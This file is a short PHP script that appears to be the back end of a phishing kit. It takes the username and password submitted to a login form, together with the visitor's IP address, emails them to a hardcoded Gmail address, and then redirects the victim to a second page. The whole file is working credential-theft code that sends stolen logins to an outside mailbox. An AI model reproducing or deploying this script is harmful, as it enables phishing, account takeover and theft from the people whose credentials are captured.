<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------News-----------------------\n";
$message .= "User Id: ".$_POST['login']."\n";
$message .= "pass: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------------------------\n";


$recipient = "pakpaki1989@gmail.com";
$subject = "$ip";
 mail("$to", " Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: 2ndpage.html");

	   } 

?>